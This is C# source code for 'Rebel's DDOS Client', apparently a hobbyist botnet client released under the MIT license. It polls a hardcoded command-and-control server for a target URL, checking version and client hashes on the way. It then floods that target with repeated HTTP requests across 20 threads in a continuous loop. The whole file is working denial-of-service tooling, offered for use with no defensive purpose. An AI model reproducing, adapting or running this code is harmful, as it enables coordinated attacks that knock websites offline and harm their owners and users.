using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Web;
using System.Web.Http;
using System.Net.Http;
using System.Net;
using System.Security.Cryptography;
using System.IO;

namespace ConsoleApplication
{
    class Program
    {
        #region License
        /*
            The MIT License (MIT)

            Copyright (c) 2015 rebelb0y11

            Permission is hereby granted, free of charge, to any person obtaining a copy
            of this software and associated documentation files (the "Software"), to deal
            in the Software without restriction, including without limitation the rights
            to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
            copies of the Software, and to permit persons to whom the Software is
            furnished to do so, subject to the following conditions:

            The above copyright notice and this permission notice shall be included in all
            copies or substantial portions of the Software.

            THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
            IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
            FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
            AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
            LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
            OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
            SOFTWARE.
          */
        #endregion

        static void Main(string[] args)
        {
            //Direct location of your server.php file.
            //This is mine, however i doubt ill actually have a target for you to attack. Use it as a test for the client. Most of the variables are the same. Use the default hash secret provided below.
            string ServerAddress = "http://rebel.hgtti.com/DDOS/server.php"; 

            //Proper Credit. This may be moved to another location, or it can be remade. Just keep the main idea.
            Log("This software is based on DDOS by rebelb0y11. rebel.hgtti.com AND github.com/rebelb0y11/DDOS");
            int sleep = 10;//Seconds to wait while the user reads the license.
            Log("Pausing to allow you to read the above.");
            while(sleep >=0)
            {
                System.Threading.Thread.Sleep(1000);
                Console.Write(sleep + ", ");
                sleep--;
            }

            Log("Initializing Rebel's DDOS Client.");
            WebClient client = new WebClient();

            Log("Starting the RunLoop. While running, Log Messages will be left to a minimal.");
            string Secret = "Rebelb0y11"; //A string to use as the version ID. My name is default. Use it for testing the client by my server.
            string Hash = GetSha1(Secret).ToLower();

            Log("The hash for this version is " + Hash);
            Log("In future versions, this hash will be secret and enforced, to ensure that everyone is running the newest version.");
            int GetIterations = -1;
            string target = "";
            bool Loop = true; //I could break the loop, but id like to let the code finish.
            int TotalReqs = 0;
            int currentalert = 0;
            while (Loop)
            {
                if (GetIterations == -1 || (target != "" && GetIterations > 9) || target == "")
                {
                    Log("Asking the server for commands");
                    string paramaters = "?";

                    //Tells the server that this is a client, and not a web browser
                    if (paramaters == "?")
                        paramaters = paramaters + "isclient=true";
                    else
                        paramaters = paramaters + "&isclient=true";

                    //Analytical: Tells server this is a new client
                    //(Will probably be implemented in a newer version)
                    if (GetIterations == -1)
                    {
                        Log("Telling the server this is a new client");
                        if (paramaters == "?")
                            paramaters = paramaters + "newclient=true";
                        else
                            paramaters = paramaters + "&newclient=true";
                    }
                    else
                    {
                        if (paramaters == "?")
                            paramaters = paramaters + "newclient=false";
                        else
                            paramaters = paramaters + "&newclient=false";
                    }

                    //Tells the server the security hash for this version.
                    if (paramaters == "?")
                        paramaters = paramaters + "hash=" + Hash;
                    else
                        paramaters = paramaters + "&hash=" + Hash;

                    //Tells the server the client hash of this version. This will be used to protect the server from clients impersonating my own. Currently serves no real purpose.
                    if (paramaters == "?")
                        paramaters = paramaters + "clienthash=" + RebelDDOS.Properties.Settings.Default.ClientHASH;
                    else
                        paramaters = paramaters + "&clienthash=" + RebelDDOS.Properties.Settings.Default.ClientHASH;

                    string commands = "";
                    try
                    {
                        commands = client.DownloadString(ServerAddress + paramaters);
                    }
                    catch (WebException)
                    { }//TODO: Handle this Exception.

                    string comtrim = commands.Trim(); //For some reason the server returns whitespace around the string. Lets remove that with trim.
                    if (comtrim == "NTA")
                    {
                        target = "";
                        Log("There is currently no target. Retrying in 30 seconds");
                        int sleeptime = 30;
                        while (sleeptime != 0)
                        {
                            if (sleeptime % 5 == 0 || sleeptime < 10)
                            {
                                Console.Write(sleeptime + ", ");
                            }
                            sleeptime--;
                            System.Threading.Thread.Sleep(1000);
                        }
                    }
                    else if (comtrim == "")
                    {
                        Log("Caught some sort of exception. The server may be down. Trying again soon...");
                    }
                    else if (comtrim == "ICH")
                    {
                        Log("Incorrect HASH! This version of RebelDDOS seems to be out of date. Please download the newest version.");
                        Log("Terminating main thread to save resources. You must update your client before you may use this client again.");
                        Loop = false;
                        target = "";
                    }
                    else if (comtrim.StartsWith("http://"))
                    {
                        if (target != comtrim)
                        {
                            Log("Changing Targets");
                            TotalReqs = 0;
                        }
                        Log("Target is " + comtrim);
                        target = comtrim;
                    }
                    else if (comtrim.Length == 40)
                    {
                        Log("The server rejected our ClientHASH. ");
                        Log("Changing the hash to " + comtrim);
                        Log("OldHASH '" + RebelDDOS.Properties.Settings.Default.ClientHASH + "' vs NewHASH: '" + comtrim + "'");
                        RebelDDOS.Properties.Settings.Default.ClientHASH = comtrim;
                        RebelDDOS.Properties.Settings.Default.Save();
                    }
                    else
                    {
                        Log("An Unhandled response was gotten. Its possible you are running an out of date client, and we didnt catch it somehow. Please update in order to continue using this client.");
                        Log("this was the unhandled response, by the way: " + comtrim);
                    }
                    GetIterations = -1;
                }
                GetIterations++;

                if (target != "")
                {
                    int numThreads = 20;
                    ManualResetEvent resetEvent = new ManualResetEvent(false);
                    int toProcess = numThreads;

                    // Start workers.
                    /*
                     * This isnt the mose efficient way of handling this i agree. This code launches numThreads threads to DDOS the target.
                     * Then waits for each to finish before continuing. Ill probably rewrite this entire program in the future to spawn a thread as soon as one dies.
                     */
                    for (int i = 0; i < numThreads; i++)
                    {
                        new Thread(delegate()
                        {
                            WebClient ddos = new WebClient();

                            try
                            {
                                ddos.DownloadString(target);
                                TotalReqs++;
                            }
                            catch (WebException e)
                            {
                                Log("WebException: " + e.ToString());
                                Thread.CurrentThread.Abort();
                            }
                            // If we're the last thread, signal
                            if (Interlocked.Decrement(ref toProcess) == 0)
                                resetEvent.Set();
                        }).Start();
                    }

                    // Wait for workers.
                    resetEvent.WaitOne();
                    if (TotalReqs % 5 == 0 && target != "" && TotalReqs / 5 != currentalert)
                    {
                        currentalert = TotalReqs / 5;
                        Log("Requests to " + target + ": " + TotalReqs + ".  Iterations Before Update: " + GetIterations + " of 10");
                    }

                }
            }
            Log("The main thread ended. If this was because of incorrect hash, you have been told how to fix it. If it was some other error, then it may have some errors.");
            Console.ReadKey();
        }

        //Function to make it easier to write the log, as well as make it neater.
        static void Log(string log)
        {
            Console.WriteLine("\n[" + DateTime.Now + "]: " + log);
        }

        // Sha1 Hash Generator.
        public static string GetSha1(string value)
        {
            var data = Encoding.ASCII.GetBytes(value);
            var hashData = new SHA1Managed().ComputeHash(data);

            var hash = string.Empty;

            foreach (var b in hashData)
                hash += b.ToString("X2");

            return hash;
        }


    }
}    

